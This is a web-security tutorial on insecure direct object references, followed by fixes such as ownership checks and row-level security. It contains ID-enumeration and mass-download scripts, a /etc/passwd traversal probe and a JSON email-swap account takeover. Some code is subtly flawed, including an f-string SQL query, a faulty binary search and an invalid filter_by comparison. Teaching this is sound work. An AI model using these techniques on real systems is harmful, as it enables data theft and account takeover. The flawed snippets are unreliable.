# Insecure direct object references (IDOR)

Insecure Direct Object References (IDOR) are access control vulnerabilities where applications use user-supplied input to directly access internal objects—such as database records, files, or resources—without proper authorization checks. When you see a URL like `/download?file=invoice_123.pdf` or `/user?id=456`, you're looking at potential IDOR vulnerabilities if the application doesn't verify that the authenticated user has permission to access that specific object.

IDOR is a subset of broken access control that focuses specifically on direct object references. The vulnerability is conceptually simple: if you can change `id=123` to `id=124` and see someone else's data, that's IDOR. Despite this simplicity, IDOR remains prevalent because developers often implement authentication (verifying who you are) but forget authorization (verifying what you can access).

> Only test systems you own or are explicitly authorized to assess.

## What are insecure direct object references? (core concept)

### The vulnerability pattern

**Direct object reference:** Application uses user input to identify a specific object:
```
Parameter → Directly accesses → Object
id=123   →   Database row 123
file=5   →   File number 5
order=789 →  Order record 789
```

**Insecure:** No check if user authorized to access that specific object.

**Example vulnerable flow:**
```python
# User requests
GET /account?id=123

# Application logic
def get_account():
    account_id = request.args.get('id')  # User-supplied
    account = database.query(f"SELECT * FROM accounts WHERE id = {account_id}")
    return render_template('account.html', account=account)
    
# Missing: Check if logged-in user owns account 123
```

### Why it's "insecure"

**Authentication present but insufficient:**
- User is authenticated (logged in) ✓
- User is authorized for the endpoint (/account) ✓
- User is NOT authorized for specific object (account 123) ✗

**The missing check:**
```python
# What's implemented
if not user.is_authenticated:
    return "Login required", 401

# What's missing
if account.owner_id != user.id:
    return "Access denied", 403
```

### IDOR vs general access control

**General access control:** Can this user access this endpoint/function?
```
Can user123 access /admin? → No (role-based)
```

**IDOR:** Can this user access this specific resource?
```
Can user123 access account456? → No (ownership-based)
Can user123 access account123? → Yes (owns it)
```

## Types of IDOR vulnerabilities

### Type 1: Direct reference to database objects

#### Numeric IDs (sequential)

**Vulnerable URL patterns:**
```
/profile?user_id=123
/order?id=456
/invoice?invoice_id=789
/document?doc_id=101
/message?msg_id=555
```

**Vulnerable code:**
```python
@app.route('/order')
def view_order():
    order_id = request.args.get('id')
    
    # Direct database query, no ownership check
    order = db.execute(
        "SELECT * FROM orders WHERE id = ?", 
        [order_id]
    ).fetchone()
    
    return render_template('order.html', order=order)
```

**Exploitation:**
```python
# Enumerate all orders
import requests

session = "user123_token"

for order_id in range(1, 10000):
    r = requests.get(
        f"https://target.com/order?id={order_id}",
        cookies={"session": session}
    )
    
    if r.status_code == 200 and "Order Details" in r.text:
        print(f"Order {order_id}: {extract_total(r.text)}")
        save_sensitive_data(r.text)
```

**Impact:**
- Access all customer orders
- View payment information
- See shipping addresses
- Extract business intelligence (sales volumes, pricing)

#### String-based IDs

**Vulnerable patterns:**
```
/user/john_doe
/account/customer_acme_corp
/project/website_redesign_2024
```

**Predictable naming conventions:**
```
firstname_lastname: john_smith, jane_doe
company_name: acme_corp, globex_inc
pattern_year: project_2024, report_2025
```

**Exploitation:**
```python
common_names = ['john_smith', 'jane_doe', 'admin', 'test', 'demo']
companies = ['acme', 'globex', 'initech', 'umbrella']

for name in common_names:
    test_url(f"/user/{name}")

for company in companies:
    test_url(f"/account/{company}_corp")
```

### Type 2: Direct reference to static files

#### Incrementing filenames

**Vulnerable file storage pattern:**
```
/uploads/1.pdf
/uploads/2.pdf
/uploads/3.pdf
/documents/invoice_001.pdf
/documents/invoice_002.pdf
/chat_logs/12344.txt
/chat_logs/12345.txt
```

**Vulnerable code:**
```python
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    
    # No authorization check
    file_path = f"/var/www/uploads/{filename}"
    return send_file(file_path)
```

**Exploitation:**
```bash
# Manual enumeration
curl https://target.com/download?file=1.pdf -o 1.pdf
curl https://target.com/download?file=2.pdf -o 2.pdf
curl https://target.com/download?file=3.pdf -o 3.pdf

# Automated mass download
for i in {1..10000}; do
    wget https://target.com/download?file=$i.pdf
done
```

**Real-world example - Chat transcripts:**
```
URL: https://support.com/transcript?id=12345

Application logic:
- Save chat to: /var/www/chats/12345.txt
- Filename = chat session ID (incremental)
- No check if user participated in chat 12345

Exploitation:
- Enumerate: 12344, 12345, 12346, ...
- Download all chat transcripts
- Extract: Customer names, emails, support issues, complaints
```

#### Timestamp-based filenames

**Pattern:**
```
/backup/backup_20240115_103045.sql
/reports/sales_20240201.xlsx
/exports/users_1705329600.csv  (Unix timestamp)
```

**Exploitation:**
```python
import datetime

# Generate timestamp range
start = datetime.datetime(2024, 1, 1)
end = datetime.datetime(2024, 2, 1)

while start < end:
    timestamp = int(start.timestamp())
    test_url(f"/exports/users_{timestamp}.csv")
    start += datetime.timedelta(hours=1)
```

#### Hash-based filenames (weak hashing)

**Pattern:**
```
/files/5f4dcc3b5aa765d61d8327deb882cf99.pdf  (MD5 hash)
```

**If hash is predictable:**
```python
import hashlib

# If filename = MD5(user_id)
for user_id in range(1, 10000):
    hash_value = hashlib.md5(str(user_id).encode()).hexdigest()
    test_url(f"/files/{hash_value}.pdf")
```

### Type 3: UUID/GUID references (seemingly secure but vulnerable)

**Example with UUIDs:**
```
/document/a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**Challenge:** UUIDs are unpredictable (can't enumerate).

**But vulnerable if:**

**1) UUIDs leaked elsewhere:**
```html
<!-- User profile page -->
<div class="documents">
    <a href="/doc/a1b2c3d4-e5f6-7890-abcd-ef1234567890">
        Financial Report Q4 2024
    </a>
</div>

<!-- Blog post with comments -->
<div class="comment" data-user-id="f9e8d7c6-b5a4-3210-9876-fedcba098765">
    User said: "Great article!"
</div>
```

**2) Exposed in API responses:**
```json
// GET /api/public/posts
{
  "posts": [
    {
      "id": 123,
      "title": "Public Post",
      "author_uuid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
    }
  ]
}

// Now access: /api/users/a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**3) Predictable UUID generation (bad implementation):**
```python
# BAD: Predictable UUID
import uuid

# Version 1 UUID includes timestamp + MAC address
user_uuid = uuid.uuid1()  # Predictable!

# Attacker can generate valid UUIDs if they know:
# - Creation time range
# - Server MAC address (often leaked)
```

### Type 4: Compound references (multiple parameters)

**Pattern:**
```
/transaction?account=123&transaction=456
/project/5/document/12
/company/acme/employee/789
```

**Vulnerability - checking only one parameter:**
```python
@app.route('/project/<int:project_id>/document/<int:doc_id>')
def view_document(project_id, doc_id):
    # Check user has access to project
    if not user_can_access_project(current_user, project_id):
        return "Access denied", 403
    
    # But doesn't check if document belongs to THIS project!
    document = Document.query.get(doc_id)
    return render_template('document.html', doc=document)
```

**Exploitation:**
```
Attacker has access to: Project 5
Target document is in: Project 10 (no access)
Target document ID: 999

Attack: /project/5/document/999
- Project 5 check passes ✓
- Document 999 retrieved ✗ (belongs to project 10)
```

### Type 5: Indirect object references (still vulnerable)

**Pattern - Reference mapping table:**
```
User sees: /document?ref=abc123
Backend translates: ref=abc123 → document_id=456
```

**Vulnerable if mapping is predictable or enumerable:**
```python
# Mapping table
references = {
    'abc123': 456,
    'abc124': 457,  # Sequential reference codes
    'abc125': 458,
}

@app.route('/document')
def view_doc():
    ref = request.args.get('ref')
    doc_id = references.get(ref)
    
    # Still no authorization check!
    document = Document.query.get(doc_id)
    return render_template('doc.html', doc=document)
```

## Advanced exploitation techniques

### Technique 1: Mass enumeration with automation

**Burp Intruder setup:**
```
1. Capture request:
   GET /account?id=123 HTTP/1.1

2. Mark injection point:
   GET /account?id=§123§ HTTP/1.1

3. Payload type: Numbers
   From: 1
   To: 10000
   Step: 1

4. Grep - Match:
   - "Account Details"
   - "Email:"
   - "Balance:"
   
5. Start attack, filter successful requests
```

**Python script for faster enumeration:**
```python
import requests
import concurrent.futures

def test_id(user_id):
    try:
        r = requests.get(
            f'https://target.com/account?id={user_id}',
            cookies={'session': 'your_session'},
            timeout=5
        )
        
        if r.status_code == 200 and 'Account Details' in r.text:
            return (user_id, extract_email(r.text))
    except:
        pass
    return None

# Parallel requests for speed
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(test_id, range(1, 100000))
    
    for result in results:
        if result:
            user_id, email = result
            print(f"User {user_id}: {email}")
```

### Technique 2: Binary search for valid IDs

**If sequential IDs but large range:**
```python
def binary_search_valid_ids(min_id, max_id):
    valid_ids = []
    
    # Find maximum valid ID
    high = max_id
    low = min_id
    
    while low <= high:
        mid = (low + high) // 2
        
        if is_valid_id(mid):
            low = mid + 1
            valid_ids.append(mid)
        else:
            high = mid - 1
    
    return valid_ids
```

### Technique 3: Response comparison for blind IDOR

**When no visible data difference:**
```python
# Baseline: Your own resource
response_own = requests.get('/account?id=123', cookies=session)

# Test: Someone else's resource
response_other = requests.get('/account?id=456', cookies=session)

# Compare
if response_own.elapsed != response_other.elapsed:
    print("Timing difference - resource might exist")

if len(response_own.content) != len(response_other.content):
    print("Content length difference - accessing different data")

if response_own.status_code != response_other.status_code:
    print("Status code difference")
```

### Technique 4: Parameter pollution for bypass

**Vulnerable parameter handling:**
```python
# Application takes first value
account_id = request.args.get('id')  # Gets 123

# Test: /account?id=123&id=456
# May process id=456 instead
```

**Or array injection:**
```
/account?id[]=123&id[]=456
/account?id=123,456
```

### Technique 5: Path traversal combined with IDOR

**Vulnerable:**
```
/download?file=invoice_123.pdf

Test: /download?file=../../../etc/passwd
Test: /download?file=../../invoices/invoice_456.pdf
```

### Technique 6: JSON parameter tampering

**API request:**
```json
POST /api/update-profile
{
  "user_id": 123,
  "email": "attacker@evil.com"
}
```

**Change user_id:**
```json
{
  "user_id": 456,  // Target victim
  "email": "attacker@evil.com"  // Attacker gains access
}
```

## Real-world IDOR examples

### Example 1: Medical records exposure

**Scenario:** Healthcare portal

**Vulnerable URL:**
```
https://patient-portal.com/records?patient_id=12345
```

**Impact:**
- Enumerate patient IDs: 12344, 12345, 12346
- Access: Medical history, diagnoses, prescriptions, SSNs
- HIPAA violation, massive privacy breach

### Example 2: Banking transaction details

**Scenario:** Online banking

**Vulnerable URL:**
```
https://bank.com/transaction/details/7890123
```

**Exploitation:**
```
- Try: 7890122, 7890123, 7890124
- Exposed: Account numbers, amounts, recipient names
- Can map: Who pays whom, salary information, spending patterns
```

### Example 3: Private document access

**Scenario:** Cloud storage service

**Vulnerable URL:**
```
https://cloudstorage.com/file/download/abc123
```

**Exploitation:**
```
- File IDs leaked in sharing links
- Guess sequential IDs: abc122, abc123, abc124
- Download: Tax returns, contracts, confidential documents
```

### Example 4: Social media private messages

**Scenario:** Social platform API

**Vulnerable endpoint:**
```
GET /api/message/12345
```

**No check if user is sender or recipient:**
```python
for msg_id in range(1, 1000000):
    response = get_message(msg_id)
    if response.status_code == 200:
        print(f"Message {msg_id}: {response.json()['content']}")
```

**Impact:** Read all private messages on platform.

## Prevention strategies

### 1) Implement proper authorization checks

**Vulnerable:**
```python
@app.route('/account')
def view_account():
    account_id = request.args.get('id')
    account = Account.query.get(account_id)
    return render_template('account.html', account=account)
```

**Secure:**
```python
@app.route('/account')
@login_required
def view_account():
    account_id = request.args.get('id')
    account = Account.query.get(account_id)
    
    # Check ownership
    if account.owner_id != current_user.id:
        # Check if admin
        if not current_user.is_admin:
            abort(403)  # Access denied
    
    return render_template('account.html', account=account)
```

### 2) Use indirect references

**Instead of exposing internal IDs:**
```python
# Bad: Direct database ID
/document?id=123

# Good: User-specific reference
/document?ref=a1b2c3d4
```

**Implementation with mapping:**
```python
# Generate unique reference per user per document
def generate_reference(user_id, document_id):
    return hashlib.sha256(
        f"{user_id}:{document_id}:{SECRET_KEY}".encode()
    ).hexdigest()[:16]

# Store mapping
user_document_refs = {
    'a1b2c3d4': {'user_id': 123, 'document_id': 456}
}

@app.route('/document')
def view_document():
    ref = request.args.get('ref')
    mapping = user_document_refs.get(ref)
    
    if not mapping or mapping['user_id'] != current_user.id:
        abort(403)
    
    document = Document.query.get(mapping['document_id'])
    return render_template('doc.html', doc=document)
```

### 3) Query only user's own resources

**Bad - Query any record:**
```python
def get_order(order_id):
    return Order.query.get(order_id)
```

**Good - Query user's records only:**
```python
def get_order(order_id, user_id):
    return Order.query.filter_by(
        id=order_id,
        user_id=user_id
    ).first_or_404()
```

**Usage:**
```python
@app.route('/order/<int:order_id>')
@login_required
def view_order(order_id):
    # Can only retrieve if order belongs to current user
    order = get_order(order_id, current_user.id)
    return render_template('order.html', order=order)
```

### 4) Implement access control at database level

**Database constraints:**
```sql
-- Row-level security (PostgreSQL)
CREATE POLICY user_documents ON documents
    FOR ALL
    TO app_user
    USING (owner_id = current_setting('app.user_id')::INTEGER);
    
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;
```

**ORM-level filtering:**
```python
# Django ORM
class Document(models.Model):
    owner = models.ForeignKey(User)
    
    class Meta:
        # Always filter by owner
        default_permissions = ()
        
    @classmethod
    def get_for_user(cls, doc_id, user):
        return cls.objects.get(id=doc_id, owner=user)
```

### 5) Use random, unpredictable identifiers

**Bad - Sequential:**
```python
document_id = max(Document.objects.all(), key=lambda x: x.id).id + 1
```

**Good - UUID:**
```python
import uuid

class Document(db.Model):
    id = db.Column(
        db.String(36), 
        primary_key=True, 
        default=lambda: str(uuid.uuid4())
    )
```

**Still requires authorization checks! UUIDs alone don't prevent IDOR.**

### 6) Implement rate limiting

**Prevent mass enumeration:**
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: current_user.id)

@app.route('/account')
@limiter.limit("10 per minute")
def view_account():
    # ... authorization checks ...
    pass
```

### 7) Log and monitor suspicious activity

**Detect enumeration attempts:**
```python
def check_suspicious_activity(user_id):
    # Count failed access attempts in last minute
    failed_attempts = AccessLog.query.filter_by(
        user_id=user_id,
        status='denied',
        timestamp > datetime.now() - timedelta(minutes=1)
    ).count()
    
    if failed_attempts > 10:
        alert_security_team(user_id)
        temporarily_block_user(user_id)
```
